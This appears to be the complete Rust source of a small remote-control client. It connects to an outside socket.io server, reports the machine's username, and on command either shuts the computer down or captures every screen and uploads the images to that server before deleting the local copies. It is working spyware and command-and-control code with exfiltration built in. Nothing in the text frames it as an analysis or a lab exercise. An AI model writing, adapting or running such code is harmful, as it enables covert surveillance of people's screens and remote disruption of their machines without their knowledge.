use std::{fs, thread, time};
use tokio::fs::File;
use tokio_util::codec::{BytesCodec, FramedRead};
use std::time::Instant;
use reqwest::{Body, Client, multipart};
use rust_socketio::{ClientBuilder, Payload, RawClient};
use serde_json::json;


fn main() {
    ClientBuilder::new("http://sket.chipirones.club")
        .namespace("/")
        .on("comm", callback)
        .on("join", join_callback)
        .on("error", |err, _| eprintln!("Error: {:#?}", err))
        .connect()
        .expect("Connection failed");

    thread::sleep(time::Duration::from_millis(1000));

    loop {
        thread::sleep(time::Duration::from_millis(1000));
    }
}

fn join_callback(_payload: Payload, socket: RawClient) {
    socket.emit("comm", json!({"name": whoami::username()})).expect("Server unreachable");
}

fn callback(payload: Payload, _socket: RawClient) {
    match payload {
        Payload::String(mut str) => {
            str = str.replace("\"", "");

            match str.as_str() {
                "shutdown" => {
                    system_shutdown::shutdown().expect("Did not work");
                }
                "ss" => {
                    let _ = Instant::now();
                    let screens = screenshots::Screen::all().unwrap();

                    for screen in screens {
                        println!("SCREEN");
                        let image = screen.capture().unwrap();
                        let buffer = image.buffer();

                        let path: String = format!("{}.png", screen.display_info.id);

                        fs::write(&path, &buffer).expect("Error writing file");

                        println!("Wrote file");

                        let rt = tokio::runtime::Runtime::new().unwrap();

                        rt.block_on(async {
                            rq_post(&path).await.expect("Did not work");
                        });

                        println!("Eliminando archivo");
                        fs::remove_file(&path).expect("Error removing file");
                        println!("Eliminado archivo");
                    }
                }
                _ => {
                    println!("Received: {}", str)
                }
            }
        }
        Payload::Binary(bin_data) => println!("Received bytes: {:#?}", bin_data),
    }
}

async fn rq_post(file_name: &String) -> anyhow::Result<String> {
    println!("Sending file");
    let client = Client::new();
    let file = File::open(file_name).await?;

    let stream = FramedRead::new(file, BytesCodec::new());
    let fb = Body::wrap_stream(stream);
    let sf = multipart::Part::stream(fb)
        .file_name("imagen.png")
        .mime_str("image/png")?;

    let form = multipart::Form::new()
        .part("ss", sf);

    println!("Posting file");
    let response = client.post("http://sket.chipirones.club/image").multipart(form).send().await?;
    println!("Posted file");
    let result = response.text().await?;

    Ok(result)
}